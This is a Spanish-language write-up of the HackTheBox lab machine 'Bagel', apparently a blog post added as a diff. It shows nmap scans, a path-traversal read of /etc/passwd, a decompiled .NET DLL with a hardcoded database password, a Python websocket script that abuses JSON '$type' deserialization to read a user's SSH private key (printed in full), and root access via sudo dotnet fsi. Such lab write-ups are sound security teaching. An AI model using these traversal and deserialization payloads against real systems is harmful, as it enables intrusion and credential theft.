@@ -1,0 +1,470 @@
+---
+layout: post
+title: Bagel
+date: 2023-06-03
+description:
+img:
+fig-caption:
+tags: [OSCP]
+---
+___
+
+<center><img src="/writeups/assets/img/Bagel-htb/Bagel.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Enumeración Web
+
+* LFI
+
+* Fuzzing de procesos internos
+
+* Reversing DLL - DnsPy
+
+* Python Scripting - Conexión con WebSocket
+
+* Arbitrary File Read - Obtención id_rsa de acceso por SSH
+
+* Abuso de Privilegio a nivel de sudoers (Escalada de Privilegios)
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.201 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 20:02 GMT
+Nmap scan report for 10.10.11.201
+Host is up (0.045s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+8000/tcp open  http-alt
+
+Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p22,5000,8000 10.10.11.201 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 20:03 GMT
+Nmap scan report for 10.10.11.201
+Host is up (0.051s latency).
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
+| ssh-hostkey: 
+|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
+|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
+5000/tcp open  upnp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Server: Microsoft-NetCore/2.0
+|     Date: Wed, 31 May 2023 13:24:31 GMT
+|     Connection: close
+|   HTTPOptions: 
+|     HTTP/1.1 400 Bad Request
+|     Server: Microsoft-NetCore/2.0
+|     Date: Wed, 31 May 2023 13:24:49 GMT
+|     Connection: close
+|   Help: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/html
+|     Server: Microsoft-NetCore/2.0
+|     Date: Wed, 31 May 2023 13:25:00 GMT
+|     Content-Length: 52
+|     Connection: close
+|     Keep-Alive: true
+|     <h1>Bad Request (Invalid request line (parts).)</h1>
+|   RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/html
+|     Server: Microsoft-NetCore/2.0
+|     Date: Wed, 31 May 2023 13:24:31 GMT
+|     Content-Length: 54
+|     Connection: close
+|     Keep-Alive: true
+|     <h1>Bad Request (Invalid request line (version).)</h1>
+|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/html
+|     Server: Microsoft-NetCore/2.0
+|     Date: Wed, 31 May 2023 13:25:01 GMT
+|     Content-Length: 52
+|     Connection: close
+|     Keep-Alive: true
+|_    <h1>Bad Request (Invalid request line (parts).)</h1>
+8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
+|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 NOT FOUND
+|     Server: Werkzeug/2.2.2 Python/3.10.9
+|     Date: Wed, 31 May 2023 13:24:32 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 207
+|     Connection: close
+|     <!doctype html>
+|     <html lang=en>
+|     <title>404 Not Found</title>
+|     <h1>Not Found</h1>
+|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+|   GetRequest: 
+|     HTTP/1.1 302 FOUND
+|     Server: Werkzeug/2.2.2 Python/3.10.9
+|     Date: Wed, 31 May 2023 13:24:26 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 263
+|     Location: http://bagel.htb:8000/?page=index.html
+|     Connection: close
+|     <!doctype html>
+|     <html lang=en>
+|     <title>Redirecting...</title>
+|     <h1>Redirecting...</h1>
+|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
+|   Socks5: 
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+|     "http://www.w3.org/TR/html4/strict.dtd">
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 400</p>
+|     <p>Message: Bad request syntax ('
+|     ').</p>
+|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
+|     </body>
+|_    </html>
+|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5000-TCP:V=7.93%I=7%D=5/31%Time=6477A814%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Microsoft
+SF:-NetCore/2\.0\r\nDate:\x20Wed,\x2031\x20May\x202023\x2013:24:31\x20GMT\
+SF:r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,E8,"HTTP/1\.1\x20400\x2
+SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-N
+SF:etCore/2\.0\r\nDate:\x20Wed,\x2031\x20May\x202023\x2013:24:31\x20GMT\r\
+SF:nContent-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r
+SF:\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(version\)
+SF:\.\)</h1>")%r(HTTPOptions,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nSer
+SF:ver:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Wed,\x2031\x20May\x202023\x2
+SF:013:24:49\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(Help,E6,"HTTP/1\.1
+SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20M
+SF:icrosoft-NetCore/2\.0\r\nDate:\x20Wed,\x2031\x20May\x202023\x2013:25:00
+SF:\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:
+SF:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\
+SF:(parts\)\.\)</h1>")%r(SSLSessionReq,E6,"HTTP/1\.1\x20400\x20Bad\x20Requ
+SF:est\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\
+SF:r\nDate:\x20Wed,\x2031\x20May\x202023\x2013:25:01\x20GMT\r\nContent-Len
+SF:gth:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Ba
+SF:d\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(
+SF:TerminalServerCookie,E6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
+SF:Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Wed
+SF:,\x2031\x20May\x202023\x2013:25:01\x20GMT\r\nContent-Length:\x2052\r\nC
+SF:onnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x2
+SF:0\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(TLSSessionReq,E
+SF:6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\n
+SF:Server:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Wed,\x2031\x20May\x202023
+SF:\x2013:25:01\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\
+SF:nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\
+SF:x20line\x20\(parts\)\.\)</h1>");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port8000-TCP:V=7.93%I=7%D=5/31%Time=6477A80F%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,1EA,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\
+SF:x20Python/3\.10\.9\r\nDate:\x20Wed,\x2031\x20May\x202023\x2013:24:26\x2
+SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
+SF:\x20263\r\nLocation:\x20http://bagel\.htb:8000/\?page=index\.html\r\nCo
+SF:nnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title
+SF:>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20shoul
+SF:d\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x
+SF:20<a\x20href=\"http://bagel\.htb:8000/\?page=index\.html\">http://bagel
+SF:\.htb:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\x20the\x20li
+SF:nk\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nS
+SF:erver:\x20Werkzeug/2\.2\.2\x20Python/3\.10\.9\r\nDate:\x20Wed,\x2031\x2
+SF:0May\x202023\x2013:24:32\x20GMT\r\nContent-Type:\x20text/html;\x20chars
+SF:et=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doc
+SF:type\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<
+SF:h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found
+SF:\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manu
+SF:ally\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p
+SF:>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTM
+SF:L\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org
+SF:/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\
+SF:x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"te
+SF:xt/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\
+SF:x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\
+SF:x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20
+SF:\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\
+SF:x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\x05\\x04\\x0
+SF:0\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20\x20\x20\x20
+SF:\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20
+SF:-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x2
+SF:0\x20\x20\x20</body>\n</html>\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 106.25 seconds
+```
+
+Añado el dominio ```bagel.htb``` al ```/etc/hosts```
+
+## Puerto 8000 (HTTP)
+
+Con ```whatweb``` analizo las tecnologías que emplea el servidor web
+
+```null
+whatweb http://10.10.11.201:8000
+http://10.10.11.201:8000 [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.10.9], IP[10.10.11.201], Python[3.10.9], RedirectLocation[http://bagel.htb:8000/?page=index.html], Title[Redirecting...], Werkzeug[2.2.2]
+http://bagel.htb:8000/?page=index.html [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.10.9], IP[10.10.11.201], JQuery, Meta-Author[freehtml5.co], Modernizr[2.6.2.min], Open-Graph-Protocol, Python[3.10.9], Script, Title[Bagel &mdash; Free Website Template, Free HTML5 Template by freehtml5.co], Werkzeug[2.2.2], X-UA-Compatible[IE=edge]
+```
+
+La página principal se ve así:
+
+<img src="/writeups/assets/img/Bagel-htb/1.png" alt="">
+
+El parámetro ```?page``` es vulnerable a LFI
+
+```null
+curl -s -X GET 'http://bagel.htb:8000/?page=../../../../../../../etc/passwd' | grep sh$
+root:x:0:0:root:/root:/bin/bash
+developer:x:1000:1000::/home/developer:/bin/bash
+phil:x:1001:1001::/home/phil:/bin/bash
+```
+
+Utilizo el ```Intruder``` de ```BurpSuite``` para listar procesos. Encuentro uno en particular en el que se ejecuta una DLL
+
+<img src="/writeups/assets/img/Bagel-htb/3.png" alt="">
+
+La descargo y transfiero a una máquina Windows para analizarla con ```DnsPy```
+
+```null
+curl -s -X GET 'http://bagel.htb:8000/?page=../../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll' -o bagel.dll
+```
+
+Una función se encarga de serializar y deserializar data en JSON
+
+```null
+		// Token: 0x0600000B RID: 11 RVA: 0x000021A8 File Offset: 0x000003A8
+		private static void MessageReceived(object sender, MessageReceivedEventArgs args)
+		{
+			string json = "";
+			bool flag = args.Data != null && args.Data.Count > 0;
+			if (flag)
+			{
+				json = Encoding.UTF8.GetString(args.Data.Array, 0, args.Data.Count);
+			}
+			Handler handler = new Handler();
+			object obj = handler.Deserialize(json);
+			object obj2 = handler.Serialize(obj);
+			Bagel._Server.SendAsync(args.IpPort, obj2.ToString(), default(CancellationToken));
+```
+
+
+Esa data corresponde a los ```orders``` definidos en otras funciones
+
+```null
+namespace bagel_server
+{
+	// Token: 0x02000008 RID: 8
+	[NullableContext(1)]
+	[Nullable(0)]
+	public class Orders
+	{
+		// Token: 0x17000004 RID: 4
+		// (get) Token: 0x06000014 RID: 20 RVA: 0x000022FF File Offset: 0x000004FF
+		// (set) Token: 0x06000015 RID: 21 RVA: 0x00002307 File Offset: 0x00000507
+		public object RemoveOrder { get; set; }
+
+		// Token: 0x17000005 RID: 5
+		// (get) Token: 0x06000016 RID: 22 RVA: 0x00002310 File Offset: 0x00000510
+		// (set) Token: 0x06000017 RID: 23 RVA: 0x0000232D File Offset: 0x0000052D
+		public string WriteOrder
+		{
+			get
+			{
+				return this.file.WriteFile;
+			}
+			set
+			{
+				this.order_info = value;
+				this.file.WriteFile = this.order_info;
+			}
+		}
+
+		// Token: 0x17000006 RID: 6
+		// (get) Token: 0x06000018 RID: 24 RVA: 0x0000234C File Offset: 0x0000054C
+		// (set) Token: 0x06000019 RID: 25 RVA: 0x0000236C File Offset: 0x0000056C
+		public string ReadOrder
+		{
+			get
+			{
+				return this.file.ReadFile;
+			}
+			set
+			{
+				this.order_filename = value;
+				this.order_filename = this.order_filename.Replace("/", "");
+				this.order_filename = this.order_filename.Replace("..", "");
+				this.file.ReadFile = this.order_filename;
+			}
+		}
+
+		// Token: 0x04000009 RID: 9
+		private string order_filename;
+
+		// Token: 0x0400000A RID: 10
+		private string order_info;
+
+		// Token: 0x0400000B RID: 11
+		private File file = new File();
+	}
+}
+```
+
+Se exponen las credenciales de acceso a la base de datos, pero no se reutilizan por SSH
+
+```null
+using System;
+using Microsoft.Data.SqlClient;
+
+namespace bagel_server
+{
+	// Token: 0x0200000A RID: 10
+	public class DB
+	{
+		// Token: 0x06000022 RID: 34 RVA: 0x00002518 File Offset: 0x00000718
+		[Obsolete("The production team has to decide where the database server will be hosted. This method is not fully implemented.")]
+		public void DB_connection()
+		{
+			string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K";
+			SqlConnection sqlConnection = new SqlConnection(text);
+		}
+	}
+}
+```
+
+Con el typo ```File``` es posible llegar a leer archivos
+
+```null
+namespace bagel_server
+{
+	// Token: 0x02000009 RID: 9
+	[NullableContext(1)]
+	[Nullable(0)]
+	public class File
+	{
+		// Token: 0x17000007 RID: 7
+		// (get) Token: 0x0600001C RID: 28 RVA: 0x00002400 File Offset: 0x00000600
+		// (set) Token: 0x0600001B RID: 27 RVA: 0x000023DD File Offset: 0x000005DD
+		public string ReadFile
+		{
+			get
+			{
+				return this.file_content;
+			}
+			set
+			{
+				this.filename = value;
+				this.ReadContent(this.directory + this.filename);
+			}
+		}
+```
+
+Creo un script en python que se encargue de conectarse al ```websocket``` para llamar a la función ```RemoveOrder```, la cual a la hora de deserializarse, va a tomar como argumentos el valor de ```ReadFile``` pasándole el archivo que quiero leer y el tipo donde se encuentra, en este caso ```File```
+
+```null
+import websocket, json
+
+ws = websocket.WebSocket()
+ws.connect("ws://10.10.11.201:5000")
+
+order = {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../../../../home/phil/.ssh/id_rsa"}}
+
+data = str(json.dumps(order))
+ws.send(data)
+response = ws.recv()
+
+print(response)
+```
+
+Obtengo la ```id_rsa``` del usaurio ```phil```
+
+```null
+python3 lfi.py
+{
+  "UserId": 0,
+  "Session": "Unauthorized",
+  "Time": "5:36:25",
+  "RemoveOrder": {
+    "$type": "bagel_server.File, bagel",
+    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----",
+    "WriteFile": null
+  },
+  "WriteOrder": null,
+  "ReadOrder": null
+}
+```
+
+Me conecto por SSH y puedo ver la primera flag
+
+```null
+ssh phil@10.10.11.201 -i id_rsa
+The authenticity of host '10.10.11.201 (10.10.11.201)' can't be established.
+ED25519 key fingerprint is SHA256:Di9rfN6auXa0i6Hdly0dzrLddlFqLIfzbUn30m/l7cg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.201' (ED25519) to the list of known hosts.
+Last login: Wed May 31 12:56:59 2023 from 10.10.16.16
+[phil@bagel ~]$ cat user.txt 
+051dfd29c4545e4ede7325e761cccbaa
+```
+
+Se reutilizan para ```developer``` las credenciales de la base de datos que vi en la DLL
+
+```null
+[phil@bagel ~]$ su developer
+Password: 
+[developer@bagel phil]$     
+```
+
+# Escalada
+
+Tengo un privilegio a nivel de sudoers
+
+```null
+[phil@bagel ~]$ su developer                                                                                                                                                                                   
+Password: 
+[developer@bagel phil]$ sudo -l                                                                                                                                                                                 
+Matching Defaults entries for developer on bagel:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS
+    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin
+
+User developer may run the following commands on bagel:
+    (root) NOPASSWD: /usr/bin/dotnet
+```
+
+Puedo ejecutar como el usuario ```root``` el comando ```dotnet```. Con una sesión interactiva, leo archivos privilegiados, como la ```root.txt```
+
+```null
+[developer@bagel phil]$ sudo dotnet fsi
+
+Microsoft (R) F# Interactive version 12.0.0.0 for F# 6.0
+Copyright (c) Microsoft Corporation. All Rights Reserved.
+
+For help type #help;;
+
+> System.IO.File.ReadAllLines("/root/root.txt");;   
+val it: string[] = [|"273cc60abfdf4ccb570ddb309a55763a"|]
+```
